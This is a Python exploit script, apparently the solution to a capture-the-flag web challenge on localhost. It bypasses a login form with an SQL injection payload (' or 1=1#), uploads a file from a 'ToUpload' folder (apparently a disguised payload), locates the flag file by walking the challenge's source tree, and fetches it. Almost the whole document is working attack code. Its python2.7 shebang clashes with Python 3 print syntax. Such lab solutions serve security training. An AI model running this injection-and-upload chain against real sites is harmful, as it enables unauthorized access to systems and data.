#!/usr/bin/python2.7
#coding:utf-8

import requests
import os
from os import path
import time

# current_directory = os.path.dirname(os.getcwd())
current_directory = os.path.dirname(os.getcwd()) + '\\源码\\docker\\src'
root = current_directory

target_path = 'http://localhost'

def scaner(url, num):
    for f in os.listdir(url):    
        real_url = os.path.join(url, f)
        if path.isfile(real_url):
            print(num*'  ' + 'File: ' + f)
            if 'flag' in f:
                global target_path
                length = len(root)
                tmp = real_url[length:]
                target_path += tmp
                target_path = target_path.replace('\\', '/')
        elif path.isdir(real_url):
            pass
    for f in os.listdir(url):    
        real_url = os.path.join(url, f)
        if path.isfile(real_url):
            pass
        elif path.isdir(real_url):
            print(num*'  ' + 'Subfolder: ' + f)
            scaner(real_url, num+1)

def getshell():
    print('--- Login ---')
    usr_data = {
        "name" : "' or 1=1#",
        "password" : "",
    }
    usr_header = {
    "User-Agent" : "Mozilla/5.0 (Linux; U; Android 666; en-us; Nexus S Build/GRK39F) AppleWebKit/533.1 (KHTML, like Gecko) Version/666 Mobile Safari/533.1",
    "Referer" : "http://localhost/login.php"
    }
    response = requests.post("http://localhost/login.php", data=usr_data, headers=usr_header)
    time.sleep(3)
    if response.url == 'http://localhost/upload.php' :
        print('SQL Injection Success')
    else:
        return 'Error'
    time.sleep(3)
    print('Login Success\n')

    print('--- Upload Files ---')
    files_test = {'file' : open('../ToUpload/test.jpg', 'rb')}
    response_file = requests.post(response.url, files=files_test)
    time.sleep(3)
    if response_file.status_code == 200:
        print("Uploadfile Success\n")

    print('--- List Files: All files and subfolders in the surver are listed below. ---')
    time.sleep(3)
    scaner(root, num = 0)
    time.sleep(3)

    print('\n--- Flag is located at ' + target_path +' ---')
    response_flag = requests.get(target_path, data=usr_data, headers=usr_header)
    pass
    print('\n')
    return response_flag.text

if __name__ == '__main__':
    fp = open("exp_output.txt", "a+")
    flag = getshell()
    print('--- Flag is ' + flag + ' --- \n')
    print('--- Flag is ' + flag + ' --- \n', file=fp)
    fp.close()